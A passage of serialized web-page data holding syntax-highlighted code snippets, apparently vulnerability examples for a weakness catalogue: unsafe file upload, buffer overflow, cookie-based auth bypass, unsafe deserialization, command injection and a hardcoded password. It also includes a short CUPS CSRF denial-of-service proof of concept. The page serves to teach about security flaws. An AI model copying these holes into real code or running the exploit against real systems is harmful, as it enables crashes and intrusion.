    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'imagefile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'image/pjpeg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">/* fix issue 44. Thanks to Klaus.  */</span>
        <span class="token variable">$imagewhitelist</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jfif'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.png'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.jpg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.gif'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'imagefile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$imagewhitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token function">show_error</span><span class="token punctuation">(</span><span class="token variable">$lang</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'general'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_failed'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">/* end of fix issue 44. Thanks to Klaus.  */</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'imagefile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'images/'</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'imagefile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token function">show_error</span><span class="token punctuation">(</span><span class="token variable">$lang</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'general'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_failed'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token function">chmod</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'images/'</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'imagefile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token operator">?</span><span class="token operator">></span>
27:Tbac,<span class="token keyword">function</span> <span class="token function-definition function">runEmployeeQuery</span><span class="token punctuation">(</span><span class="token variable">$dbName</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token variable">$dbName</span><span class="token punctuation">,</span><span class="token variable">$globalDbHandle</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Could not open Database"</span><span class="token operator">.</span><span class="token variable">$dbName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//Use a prepared statement to avoid CWE-89</span>
    <span class="token variable">$preparedStatement</span> <span class="token operator">=</span> <span class="token variable">$globalDbHandle</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'SELECT * FROM employees WHERE name = :name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$preparedStatement</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':name'</span> <span class="token operator">=></span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$preparedStatement</span><span class="token operator">-></span><span class="token function">fetchAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token operator">...</span>
<span class="token variable">$employeeRecord</span> <span class="token operator">=</span> <span class="token function">runEmployeeQuery</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'EmployeeDB'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'EmployeeName'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
28:T9e0,<span class="token keyword">void</span> <span class="token function">host_lookup</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>user_supplied_addr<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">struct</span> <span class="token class-name">hostent</span> <span class="token operator">*</span>hp<span class="token punctuation">;</span>
    <span class="token class-name">in_addr_t</span> <span class="token operator">*</span>addr<span class="token punctuation">;</span>
    <span class="token keyword">char</span> hostname<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token class-name">in_addr_t</span> <span class="token function">inet_addr</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>cp<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/*routine that ensures user_supplied_addr is in the right format for conversion */</span>

    <span class="token function">validate_addr_form</span><span class="token punctuation">(</span>user_supplied_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    addr <span class="token operator">=</span> <span class="token function">inet_addr</span><span class="token punctuation">(</span>user_supplied_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    hp <span class="token operator">=</span> <span class="token function">gethostbyaddr</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">in_addr</span><span class="token punctuation">)</span><span class="token punctuation">,</span> AF_INET<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>hostname<span class="token punctuation">,</span> hp<span class="token operator">-></span>h_name<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
29:T87e,<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> cat cups_dos_poc<span class="token punctuation">.</span>html  <span class="token operator">--</span><span class="token operator">></span>
<span class="token operator">&lt;</span>script<span class="token operator">></span>
<span class="token comment">// make 101 CSRFed requests to CUPS daemon via 'img' tags</span>
<span class="token comment">// causes CUPS daemon to crash</span>
<span class="token comment">// by Adrian 'pagvac' Pastor | GNUCITIZEN.org</span>

<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span><span class="token number">101</span><span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;img width=0 height=0 "</span> <span class="token operator">+</span>
        <span class="token string">"src=\"http://localhost:631/admin/?OP=add-rss-subscription&amp;SUBSCRIPTION_NAME=DOS_TEST_"</span> <span class="token operator">+</span>
        i <span class="token operator">+</span> <span class="token string">"&amp;PRINTER_URI=%23ALL%23&amp;EVENT_JOB_CREATED=on&amp;MAX_EVENTS=20\">"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/*
TESTED ON:

Ubuntu 8.04.1 (fully patched as of 19th Oct 2008)
Linux 2.6.24-21-generic #1 SMP Mon Aug 25 17:32:09 UTC 2008 i686 GNU/Linux

openSUSE 11.0 (i586)
Linux 2.6.25.5-1.1-default #1 SMP 2008-06-07 01:55:22 +0200 i686 i686 i386 GNU/Linux

Common UNIX Printing System 1.3.7
*/</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
2a:Tf12,<span class="token keyword">my</span> <span class="token variable">$x</span> <span class="token operator">=</span> new CGI<span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token operator">-></span>cookie<span class="token punctuation">(</span><span class="token string">'loggedin'</span><span class="token punctuation">)</span> <span class="token operator">ne</span> <span class="token string">"true"</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>AuthenticateUser<span class="token punctuation">(</span><span class="token variable">$x</span><span class="token operator">-></span>param<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$x</span><span class="token operator">-></span>param<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ExitError<span class="token punctuation">(</span><span class="token string">"Error: you need to log in first"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
        <span class="token comment">#Set loggedin and user cookies.</span>
        <span class="token variable">$x</span><span class="token operator">-></span>cookie<span class="token punctuation">(</span>
            <span class="token operator">-</span>name <span class="token operator">=</span> <span class="token operator">></span> <span class="token string">'loggedin'</span><span class="token punctuation">,</span>
            <span class="token operator">-</span>value <span class="token operator">=</span> <span class="token operator">></span> <span class="token string">'true'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$x</span><span class="token operator">-></span>cookie<span class="token punctuation">(</span>
            <span class="token operator">-</span>name <span class="token operator">=</span> <span class="token operator">></span> <span class="token string">'user'</span><span class="token punctuation">,</span>
            <span class="token operator">-</span>value <span class="token operator">=</span> <span class="token operator">></span> <span class="token variable">$x</span><span class="token operator">-></span>param<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token operator">-></span>cookie<span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span> <span class="token operator">eq</span> <span class="token string">"Administrator"</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    DoAdministratorTasks<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
2b:T496,def check_version(self, version):
    """
    Determine the client's version and decide whether to continue the
    handshake.
    """

    if version == self.VERSION:
        log.msg("Client version %s is valid" % version.strip())
        # Hardcoded: 2 security types: None and VNC Auth.
        self.transport.write("\x02\x01\x02")
        # Hardcoded: 1 security type: VNC Auth.
        self.transport.write("\x01\x02")
        return self.select_security_type, 1
    else:
        log.err("Can't handle VNC version %r" % version)
        self.transport.loseConnection()

def select_security_type(self, security_type):
    """
    Choose the security type that the client wants.
    """
    security_type = ord(security_type)
    if security_type == 2:
        # VNC authentication. Issue our challenge.
        self.challenge = urandom(16)
        self.transport.write(self.challenge)

        return self.vnc_authentication_result, 16
    elif security_type == 1:
        # No authentication. Just move to the SecurityResult.
        self.authenticated()
    else:
        log.err("Couldn't agree on an authentication scheme!")
        self.transport.loseConnection()
2c:T1283,<span class="token keyword">def</span> <span class="token function">check_version</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> version<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    Determine the client's version and decide whether to continue the
    handshake.
    """</span>

    <span class="token keyword">if</span> version <span class="token operator">==</span> self<span class="token punctuation">.</span>VERSION<span class="token punctuation">:</span>
        log<span class="token punctuation">.</span>msg<span class="token punctuation">(</span><span class="token string">"Client version %s is valid"</span> <span class="token operator">%</span> version<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment"># Hardcoded: 2 security types: None and VNC Auth.</span>
        self<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\x02\x01\x02"</span><span class="token punctuation">)</span>
        <span class="token comment"># Hardcoded: 1 security type: VNC Auth.</span>
        self<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\x01\x02"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>select_security_type<span class="token punctuation">,</span> <span class="token number">1</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        log<span class="token punctuation">.</span>err<span class="token punctuation">(</span><span class="token string">"Can't handle VNC version %r"</span> <span class="token operator">%</span> version<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>loseConnection<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">select_security_type</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> security_type<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    Choose the security type that the client wants.
    """</span>
    security_type <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>security_type<span class="token punctuation">)</span>
    <span class="token keyword">if</span> security_type <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token comment"># VNC authentication. Issue our challenge.</span>
        self<span class="token punctuation">.</span>challenge <span class="token operator">=</span> urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>write<span class="token punctuation">(</span>self<span class="token punctuation">.</span>challenge<span class="token punctuation">)</span>

        <span class="token keyword">return</span> self<span class="token punctuation">.</span>vnc_authentication_result<span class="token punctuation">,</span> <span class="token number">16</span>
    <span class="token keyword">elif</span> security_type <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token comment"># No authentication. Just move to the SecurityResult.</span>
        self<span class="token punctuation">.</span>authenticated<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        log<span class="token punctuation">.</span>err<span class="token punctuation">(</span><span class="token string">"Couldn't agree on an authentication scheme!"</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>loseConnection<span class="token punctuation">(</span><span class="token punctuation">)</span>
2d:T514,<span class="token class-name">img_t</span> table_ptr<span class="token punctuation">;</span> <span class="token comment">/*struct containing img data, 10kB each*/</span>
<span class="token keyword">int</span> num_imgs<span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
num_imgs <span class="token operator">=</span> <span class="token function">get_num_imgs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
table_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">img_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">img_t</span><span class="token punctuation">)</span> <span class="token operator">*</span> num_imgs<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
2e:Tde7,pitch <span class="token operator">=</span> <span class="token function">PAD</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>width<span class="token punctuation">)</span> <span class="token operator">*</span> tjPixelSize<span class="token punctuation">[</span><span class="token operator">*</span>pixelFormat<span class="token punctuation">]</span><span class="token punctuation">,</span> align<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>dstBuf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>pitch <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>height<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span>pitch <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span>height<span class="token punctuation">)</span> <span class="token operator">></span>
    <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span>
    <span class="token punctuation">(</span>dstBuf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>pitch <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>height<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
  <span class="token function">_throwg</span><span class="token punctuation">(</span><span class="token string">"tjLoadImage(): Memory allocation failure"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
2f:T732,<span class="token keyword">try</span>
<span class="token punctuation">{</span>
    <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"object.obj"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">ObjectInputStream</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span>JButton</span> button <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span>JButton</span><span class="token punctuation">)</span>in<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
30:T411,<span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span> in<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>IOException</span>
<span class="token punctuation">{</span>
    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>IOException</span><span class="token punctuation">(</span><span class="token string">"Cannot be deserialized"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
31:Ta82,<span class="token keyword">class</span> <span class="token class-name">ExampleProtocol</span><span class="token punctuation">(</span>protocol<span class="token punctuation">.</span>Protocol<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">dataReceived</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># Code that would be here would parse the incoming data</span>
        <span class="token comment"># After receiving headers, call confirmAuth() to authenticate</span>
        <span class="token keyword">pass</span>

    <span class="token keyword">def</span> <span class="token function">confirmAuth</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> headers<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            token <span class="token operator">=</span> cPickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>headers<span class="token punctuation">[</span><span class="token string">'AuthToken'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> check_hmac<span class="token punctuation">(</span>token<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> token<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> getSecretKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">raise</span> AuthFail
            self<span class="token punctuation">.</span>secure_data <span class="token operator">=</span> token<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span> AuthFail
32:T4b7,<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> cmd<span class="token punctuation">[</span>CMD_MAX<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/usr/bin/cat "</span><span class="token punctuation">;</span>
    <span class="token function">strcat</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
33:T50d,<span class="token class-name">String</span> btype <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"backuptype"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">String</span> cmd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"cmd.exe /K \" c:\\util\\rmanDB.bat "</span>
    <span class="token operator">+</span>btype<span class="token operator">+</span>
    <span class="token string">"&amp;&amp;c:\\utl\\cleanup.bat\""</span>
<span class="token punctuation">)</span>

<span class="token class-name">System<span class="token punctuation">.</span>Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
34:T676,<span class="token keyword">int</span> <span class="token function">VerifyAdmin</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>password<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span> <span class="token string">"68af404b513073584c4b6f22b6c63e6b"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Incorrect Password!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Entering Diagnostic Mode...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
35:T4d5,const crypto = require("crypto");
const fs = require("fs");
const path = require("path");

const keyPath =
  process.env.NODE_ENV === "development"
    ? path.resolve(__dirname, `../../../server/storage/comkey`)
    : path.resolve(process.env.STORAGE_DIR, `comkey`);

class CommunicationKey {
  #pubKeyName = "ipc-pub.pem";
  #storageLoc = keyPath;

  constructor() {}

  log(text, ...args) {
    console.log(`\x1b[36m[CommunicationKeyVerify]\x1b[0m ${text}`, ...args);
  }

  #readPublicKey() {
    return fs.readFileSync(path.resolve(this.#storageLoc, this.#pubKeyName));
  }

  // Given a signed payload from private key from /app/server/ this signature should
  // decode to match the textData provided. This class does verification only in collector.
  // Note: The textData is typically the JSON stringified body sent to the document processor API.
  verify(signature = "", textData = "") {
    try {
      let data = textData;
      if (typeof textData !== "string") data = JSON.stringify(data);
      return crypto.verify(
        "RSA-SHA256",
        Buffer.from(data),
        this.#readPublicKey(),
        Buffer.from(signature, "hex")
      );
    } catch {}
    return false;
  }
}

module.exports = { CommunicationKey };
36:T1f44,<span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"crypto"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"path"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> keyPath <span class="token operator">=</span>
  process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">NODE_ENV</span> <span class="token operator">===</span> <span class="token string">"development"</span>
    <span class="token operator">?</span> path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">../../../server/storage/comkey</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
    <span class="token operator">:</span> path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">STORAGE_DIR</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">comkey</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">CommunicationKey</span> <span class="token punctuation">{</span>
  #pubKeyName <span class="token operator">=</span> <span class="token string">"ipc-pub.pem"</span><span class="token punctuation">;</span>
  #storageLoc <span class="token operator">=</span> keyPath<span class="token punctuation">;</span>

  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

  <span class="token function">log</span><span class="token punctuation">(</span><span class="token parameter">text<span class="token punctuation">,</span> <span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">\x1b[36m[CommunicationKeyVerify]\x1b[0m </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>text<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token operator">...</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token function">#readPublicKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
